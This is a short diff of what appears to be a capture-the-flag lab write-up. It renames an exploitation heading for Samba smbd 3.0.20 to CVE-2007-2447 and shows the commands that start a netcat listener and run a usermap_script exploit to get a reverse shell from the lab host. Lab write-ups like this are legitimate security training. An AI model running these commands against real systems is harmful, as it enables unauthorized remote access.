@@ -157,7 +157,7 @@ user:[uucp] rid:[0x3fc]
 
 #### Exploitation
 
-##### Exploitation #1: Samba smbd 3.0.20
+##### Exploitation #1: CVE-2007-2447
 `kali@kali:/$ nc -lvnp 3333`
 
 `kali@kali:/$ ./usermap_script.py 10.10.10.3 139 10.10.14.13 3333`
